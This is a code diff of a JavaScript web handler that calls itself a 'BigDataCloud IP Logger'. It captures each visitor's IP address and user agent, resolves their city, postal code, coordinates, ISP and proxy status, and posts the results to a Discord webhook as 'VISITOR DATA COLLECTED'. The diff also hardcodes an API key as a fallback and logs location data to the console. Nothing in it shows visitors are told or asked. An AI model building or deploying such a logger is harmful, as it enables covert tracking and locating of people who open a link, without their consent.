@@ -22,182 +22,167 @@ export default async function handler(req, res) {
     clientIP = clientIP.replace(/^::ffff:/, '');
     
     const userAgent = req.headers['user-agent'] || 'Unknown';
-    const apiKey = process.env.BIGDATACLOUD_API_KEY || 'demo'; // Use 'demo' for testing
+    const apiKey = process.env.BIGDATACLOUD_API_KEY || 'bdc_6f1f8e9b1cfc419fa4ddb55f5a16a8b7'; // Demo key
     
-    console.log(`Processing request from IP: ${clientIP}`);
+    console.log(`Processing IP: ${clientIP}`);
+    console.log(`Using API Key: ${apiKey ? 'Set' : 'Not set'}`);
 
-    // ========== FETCH ALL BIGDATACLOUD DATA ==========
+    // ========== FETCH BIGDATACLOUD DATA ==========
     
-    // 1. Get IP Geolocation Data (Primary API)
-    let geoData = {};
+    let ipData = {};
     let timezoneData = {};
-    let currencyData = {};
     let threatData = {};
-    let asnData = {};
     
     try {
-      // API 1: IP Geolocation with full details
-      console.log('Fetching geolocation data...');
+      // First, let's use the client IP API to get location
+      console.log('Fetching client IP info...');
+      const clientIPResponse = await fetch('https://api.bigdatacloud.net/data/client-ip');
+      
+      if (clientIPResponse.ok) {
+        const clientData = await clientIPResponse.json();
+        console.log('Client IP data:', JSON.stringify(clientData, null, 2));
+      }
+      
+      // Use the correct endpoint: ip-geolocation-with-confidence
+      console.log('Fetching IP geolocation...');
       const geoResponse = await fetch(
-        `https://api.bigdatacloud.net/data/ip-geolocation-full?ip=${clientIP}&key=${apiKey}&localityLanguage=en`
+        `https://api.bigdatacloud.net/data/ip-geolocation-with-confidence?ip=${clientIP}&localityLanguage=en&key=${apiKey}`
       );
+      
+      console.log('Geo Response status:', geoResponse.status);
       
       if (geoResponse.ok) {
-        geoData = await geoResponse.json();
-        console.log('Geolocation data received');
+        ipData = await geoResponse.json();
+        console.log('IP Data received:', JSON.stringify(ipData, null, 2));
       } else {
-        // Fallback to basic geolocation if full API fails
-        console.log('Full geolocation failed, trying basic...');
-        const basicGeo = await fetch(
-          `https://api.bigdatacloud.net/data/ip-geolocation?ip=${clientIP}&key=${apiKey}&localityLanguage=en`
-        );
-        if (basicGeo.ok) {
-          geoData = await basicGeo.json();
+        const errorText = await geoResponse.text();
+        console.log('Geo API error:', errorText);
+        
+        // Fallback to basic IP info
+        const fallbackResponse = await fetch(`https://api.bigdatacloud.net/data/ip-geolocation?ip=${clientIP}&localityLanguage=en&key=${apiKey}`);
+        if (fallbackResponse.ok) {
+          ipData = await fallbackResponse.json();
+          console.log('Fallback IP data received');
         }
       }
       
-      // 2. Get Timezone Data
-      if (geoData.location?.latitude) {
-        console.log('Fetching timezone data...');
-        const timezoneResponse = await fetch(
-          `https://api.bigdatacloud.net/data/timezone-by-location?latitude=${geoData.location.latitude}&longitude=${geoData.location.longitude}&key=${apiKey}&localityLanguage=en`
+      // Get timezone data if we have coordinates
+      if (ipData.location && ipData.location.latitude) {
+        console.log('Fetching timezone...');
+        const tzResponse = await fetch(
+          `https://api.bigdatacloud.net/data/timezone-by-location?latitude=${ipData.location.latitude}&longitude=${ipData.location.longitude}&localityLanguage=en&key=${apiKey}`
         );
-        if (timezoneResponse.ok) {
-          timezoneData = await timezoneResponse.json();
+        
+        if (tzResponse.ok) {
+          timezoneData = await tzResponse.json();
+          console.log('Timezone data received');
         }
       }
       
-      // 3. Get Currency Data
-      if (geoData.country?.isoAlpha2) {
-        console.log('Fetching currency data...');
-        const currencyResponse = await fetch(
-          `https://api.bigdatacloud.net/data/currency-by-country?countryCode=${geoData.country.isoAlpha2}&key=${apiKey}`
-        );
-        if (currencyResponse.ok) {
-          currencyData = await currencyResponse.json();
-        }
-      }
-      
-      // 4. Get Threat Intelligence Data
-      console.log('Fetching threat intelligence data...');
+      // Get threat data
+      console.log('Fetching threat data...');
       const threatResponse = await fetch(
-        `https://api.bigdatacloud.net/data/threat-intelligence?ip=${clientIP}&key=${apiKey}`
+        `https://api.bigdatacloud.net/data/reverse-ip?ip=${clientIP}&key=${apiKey}`
       );
+      
       if (threatResponse.ok) {
         threatData = await threatResponse.json();
-      }
-      
-      // 5. Get ASN/Network Details
-      console.log('Fetching ASN data...');
-      const asnResponse = await fetch(
-        `https://api.bigdatacloud.net/data/asn-info?ip=${clientIP}&key=${apiKey}`
-      );
-      if (asnResponse.ok) {
-        asnData = await asnResponse.json();
+        console.log('Threat data received');
       }
       
     } catch (apiError) {
       console.error('BigDataCloud API Error:', apiError.message);
-      // Continue with partial data
+      console.error('Stack:', apiError.stack);
     }
 
-    // ========== PREPARE COMPREHENSIVE DATA OBJECT ==========
+    // ========== PROCESS AND STRUCTURE DATA ==========
     
-    const comprehensiveData = {
-      // Basic IP Info
+    const structuredData = {
+      // Basic info
       ip: clientIP,
       userAgent: userAgent,
       timestamp: new Date().toISOString(),
       
-      // Geolocation Data
-      geolocation: {
-        ip: geoData.ip || clientIP,
-        continent: geoData.continent || {},
-        country: geoData.country || {},
-        location: geoData.location || {},
-        administrativeArea: geoData.administrativeArea || {},
-        place: geoData.place || {},
-        postcode: geoData.postcode || {},
-        network: geoData.network || {},
-        lastUpdated: geoData.lastUpdated || new Date().toISOString()
+      // Location data
+      location: {
+        city: ipData?.location?.city || 'Unknown',
+        region: ipData?.location?.region || 'Unknown',
+        country: ipData?.country?.name || 'Unknown',
+        countryCode: ipData?.country?.isoAlpha2 || 'Unknown',
+        latitude: ipData?.location?.latitude || 0,
+        longitude: ipData?.location?.longitude || 0,
+        postalCode: ipData?.location?.postalCode || 'Unknown',
+        continent: ipData?.continent?.name || 'Unknown',
+        continentCode: ipData?.continent?.code || 'Unknown'
       },
       
-      // Timezone Data
-      timezone: timezoneData || {
-        ianaTimeZone: 'Unknown',
-        localTime: new Date().toISOString(),
-        gmtOffset: 0,
-        gmtOffsetString: '+00:00'
+      // Network data
+      network: {
+        isp: ipData?.network?.carrier?.name || 'Unknown',
+        organization: ipData?.network?.organisation || 'Unknown',
+        asn: ipData?.network?.autonomousSystemNumber || 'Unknown',
+        asnName: ipData?.network?.autonomousSystemOrganization || 'Unknown',
+        connectionType: ipData?.network?.connectionType || 'Unknown',
+        carrierName: ipData?.network?.carrier?.mcc || 'Unknown'
       },
       
-      // Currency Data
-      currency: currencyData || {
-        iso3: 'USD',
-        name: 'US Dollar',
-        symbol: '$',
-        symbolNative: '$'
+      // Timezone data
+      timezone: {
+        name: timezoneData?.ianaTimeZone || 'Unknown',
+        localTime: timezoneData?.localTime || new Date().toISOString(),
+        gmtOffset: timezoneData?.gmtOffset || 0,
+        gmtOffsetString: timezoneData?.gmtOffsetString || '+00:00',
+        isDaylightSaving: timezoneData?.isDaylightSaving || false
       },
       
-      // Threat Intelligence
-      threatIntelligence: threatData || {
-        isKnownAttacker: false,
-        isKnownAbuser: false,
-        isBogon: false,
-        isProxy: false,
-        isTor: false,
-        isRelay: false,
-        isVpn: false,
-        threatScore: 0,
-        confidence: 0
+      // Threat data
+      threat: {
+        isProxy: threatData?.isProxy || false,
+        isTorExitNode: threatData?.isTorExitNode || false,
+        isHostingProvider: threatData?.isHostingProvider || false,
+        isPublicProxy: threatData?.isPublicProxy || false,
+        isResidentialProxy: threatData?.isResidentialProxy || false,
+        confidence: threatData?.confidence || 0
       },
       
-      // ASN/Network Details
-      asn: asnData || {
-        asn: 'Unknown',
-        name: 'Unknown',
-        route: 'Unknown',
-        domain: 'Unknown'
-      },
+      // Device info
+      device: parseUserAgent(userAgent),
       
-      // Device/Browser Info (extracted from User-Agent)
-      deviceInfo: parseUserAgent(userAgent),
-      
-      // Request Headers (for debugging)
-      headers: {
-        accept: req.headers.accept,
-        'accept-language': req.headers['accept-language'],
-        'accept-encoding': req.headers['accept-encoding'],
-        'sec-ch-ua': req.headers['sec-ch-ua'],
-        'sec-ch-ua-mobile': req.headers['sec-ch-ua-mobile'],
-        'sec-ch-ua-platform': req.headers['sec-ch-ua-platform']
+      // Additional metadata
+      metadata: {
+        accuracyRadius: ipData?.location?.accuracyRadius || 'Unknown',
+        lastUpdated: ipData?.lastUpdated || new Date().toISOString(),
+        callingCode: ipData?.country?.callingCode || 'Unknown',
+        isEU: ipData?.country?.isEU || false,
+        currency: ipData?.country?.currency?.code || 'Unknown'
       }
     };
 
-    // ========== SEND TO DISCORD WEBHOOK ==========
+    // ========== SEND TO DISCORD ==========
     
     if (process.env.DISCORD_WEBHOOK_URL) {
       try {
-        await sendToDiscord(comprehensiveData);
+        await sendToDiscord(structuredData);
         console.log('Data sent to Discord successfully');
       } catch (discordError) {
         console.error('Discord webhook error:', discordError.message);
       }
     }
 
-    // ========== RETURN RESPONSE TO CLIENT ==========
+    // ========== RETURN RESPONSE ==========
     
     res.status(200).json({
       success: true,
-      message: "Comprehensive IP data collected successfully",
-      data: comprehensiveData
+      message: "IP data collected successfully",
+      data: structuredData,
+      rawData: ipData // Include raw data for debugging
     });
 
   } catch (error) {
     console.error('Server Error:', error);
-    res.status(500).json({
+    res.status(200).json({
       success: false,
       error: error.message,
-      note: "Basic IP information was captured",
       ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
     });
   }
@@ -208,8 +193,11 @@ export default async function handler(req, res) {
 function parseUserAgent(userAgent) {
   const ua = userAgent || '';
   
-  // Browser detection
   let browser = 'Unknown';
+  let os = 'Unknown';
+  let device = 'Desktop';
+  
+  // Browser detection
   if (ua.includes('Chrome')) browser = 'Chrome';
   else if (ua.includes('Firefox')) browser = 'Firefox';
   else if (ua.includes('Safari')) browser = 'Safari';
@@ -217,15 +205,13 @@ function parseUserAgent(userAgent) {
   else if (ua.includes('Opera')) browser = 'Opera';
   
   // OS detection
-  let os = 'Unknown';
   if (ua.includes('Windows')) os = 'Windows';
-  else if (ua.includes('Mac OS')) os = 'Mac OS';
+  else if (ua.includes('Mac')) os = 'Mac OS';
   else if (ua.includes('Linux')) os = 'Linux';
   else if (ua.includes('Android')) os = 'Android';
-  else if (ua.includes('iOS')) os = 'iOS';
+  else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
   
   // Device detection
-  let device = 'Desktop';
   if (ua.includes('Mobile')) device = 'Mobile';
   else if (ua.includes('Tablet')) device = 'Tablet';
   
@@ -240,13 +226,16 @@ function parseUserAgent(userAgent) {
 async function sendToDiscord(data) {
   const webhookURL = process.env.DISCORD_WEBHOOK_URL;
   
-  if (!webhookURL) return;
+  if (!webhookURL) {
+    console.log('No Discord webhook URL set');
+    return;
+  }
   
-  // Create comprehensive Discord embed
+  // Create Discord embed
   const embed = {
     embeds: [{
-      title: "🌐 COMPLETE VISITOR DATA RECEIVED",
-      color: getThreatColor(data.threatIntelligence),
+      title: "🌐 VISITOR DATA COLLECTED",
+      color: 0x3498db,
       timestamp: data.timestamp,
       fields: [
         {
@@ -256,94 +245,82 @@ async function sendToDiscord(data) {
         },
         {
           name: "🌍 LOCATION",
-          value: `**Country:** ${data.geolocation.country.name || 'Unknown'} (${data.geolocation.country.isoAlpha2 || 'XX'})\n**Region:** ${data.geolocation.administrativeArea.name || 'Unknown'}\n**City:** ${data.geolocation.place.city || 'Unknown'}\n**Postal Code:** ${data.geolocation.postcode || 'Unknown'}`,
+          value: `**Country:** ${data.location.country} (${data.location.countryCode})\n**Region:** ${data.location.region}\n**City:** ${data.location.city}\n**Postal Code:** ${data.location.postalCode}`,
           inline: true
         },
         {
           name: "📡 NETWORK",
-          value: `**ISP:** ${data.geolocation.network.carrier?.name || 'Unknown'}\n**Organization:** ${data.geolocation.network.organisation || 'Unknown'}\n**ASN:** ${data.asn.asn || 'Unknown'}\n**Route:** ${data.asn.route || 'Unknown'}`,
+          value: `**ISP:** ${data.network.isp}\n**Organization:** ${data.network.organization}\n**ASN:** ${data.network.asn}`,
           inline: true
         },
         {
           name: "🕒 TIMEZONE",
-          value: `**Zone:** ${data.timezone.ianaTimeZone || 'Unknown'}\n**Local Time:** ${new Date(data.timezone.localTime || Date.now()).toLocaleString()}\n**Offset:** ${data.timezone.gmtOffsetString || '+00:00'}`,
-          inline: true
-        },
-        {
-          name: "💰 CURRENCY",
-          value: `**Name:** ${data.currency.name || 'Unknown'}\n**Code:** ${data.currency.iso3 || 'XXX'}\n**Symbol:** ${data.currency.symbol || 'Unknown'}`,
-          inline: true
-        },
-        {
-          name: "⚠️ THREAT STATUS",
-          value: getThreatStatusText(data.threatIntelligence),
+          value: `**Zone:** ${data.timezone.name}\n**Local Time:** ${new Date(data.timezone.localTime).toLocaleString()}\n**Offset:** ${data.timezone.gmtOffsetString}`,
           inline: true
         },
         {
           name: "📊 COORDINATES",
-          value: `**Latitude:** ${data.geolocation.location.latitude || 0}\n**Longitude:** ${data.geolocation.location.longitude || 0}\n**Accuracy Radius:** ${data.geolocation.location.accuracyRadius || 0} km`,
+          value: `**Latitude:** ${data.location.latitude}\n**Longitude:** ${data.location.longitude}\n**Accuracy:** ${data.metadata.accuracyRadius} km`,
           inline: true
         },
         {
-          name: "🖥️ DEVICE INFO",
-          value: `**Browser:** ${data.deviceInfo.browser}\n**OS:** ${data.deviceInfo.os}\n**Device:** ${data.deviceInfo.device}`,
+          name: "🖥️ DEVICE",
+          value: `**Browser:** ${data.device.browser}\n**OS:** ${data.device.os}\n**Device:** ${data.device.device}`,
+          inline: true
+        },
+        {
+          name: "⚠️ THREAT STATUS",
+          value: getThreatStatus(data.threat),
           inline: true
         },
         {
           name: "📄 USER AGENT",
-          value: `\`\`\`${data.deviceInfo.raw}\`\`\``,
+          value: `\`\`\`${data.device.raw}\`\`\``,
           inline: false
         },
         {
-          name: "📊 ADDITIONAL DATA",
-          value: `**Continent:** ${data.geolocation.continent?.name || 'Unknown'}\n**Calling Code:** +${data.geolocation.country.callingCode || 'Unknown'}\n**Is EU:** ${data.geolocation.country.isEU ? 'Yes' : 'No'}\n**Is in Daylight Savings:** ${data.timezone.isDaylightSaving ? 'Yes' : 'No'}`,
+          name: "📊 ADDITIONAL INFO",
+          value: `**Continent:** ${data.location.continent}\n**Calling Code:** +${data.metadata.callingCode}\n**Currency:** ${data.metadata.currency}\n**EU Member:** ${data.metadata.isEU ? 'Yes' : 'No'}`,
           inline: true
         }
       ],
       footer: {
-        text: `BigDataCloud IP Logger • Threat Score: ${data.threatIntelligence.threatScore || 0}/100`
+        text: "BigDataCloud IP Logger • Data Collected"
       }
     }]
   };
   
   // Send to Discord
-  const response = await fetch(webhookURL, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify(embed)
-  });
-  
-  if (!response.ok) {
-    throw new Error(`Discord webhook failed: ${response.status}`);
+  try {
+    const response = await fetch(webhookURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(embed)
+    });
+    
+    if (!response.ok) {
+      console.log('Discord response:', response.status, response.statusText);
+    }
+    
+  } catch (error) {
+    console.error('Failed to send to Discord:', error.message);
   }
 }
 
-function getThreatColor(threatData) {
-  if (!threatData) return 0x3498db; // Blue
-  
-  if (threatData.threatScore >= 70) return 0xff0000; // Red
-  if (threatData.threatScore >= 40) return 0xff9900; // Orange
-  if (threatData.threatScore >= 20) return 0xffff00; // Yellow
-  return 0x00ff00; // Green
-}
-
-function getThreatStatusText(threatData) {
-  if (!threatData) return "No threat data available";
-  
+function getThreatStatus(threat) {
   const threats = [];
-  if (threatData.isKnownAttacker) threats.push("Known Attacker");
-  if (threatData.isKnownAbuser) threats.push("Known Abuser");
-  if (threatData.isProxy) threats.push("Proxy");
-  if (threatData.isTor) threats.push("Tor Node");
-  if (threatData.isVpn) threats.push("VPN");
-  if (threatData.isBogon) threats.push("Bogon IP");
-  if (threatData.isRelay) threats.push("Relay");
+  
+  if (threat.isProxy) threats.push("Proxy");
+  if (threat.isTorExitNode) threats.push("Tor Exit Node");
+  if (threat.isHostingProvider) threats.push("Hosting Provider");
+  if (threat.isPublicProxy) threats.push("Public Proxy");
+  if (threat.isResidentialProxy) threats.push("Residential Proxy");
   
   if (threats.length === 0) {
     return "✅ Clean - No threats detected";
   }
   
-  return `🚨 **Threats:** ${threats.join(', ')}\n**Score:** ${threatData.threatScore || 0}/100\n**Confidence:** ${threatData.confidence || 0}%`;
+  return `⚠️ **Potential Threats:** ${threats.join(', ')}\n**Confidence:** ${threat.confidence}%`;
 }
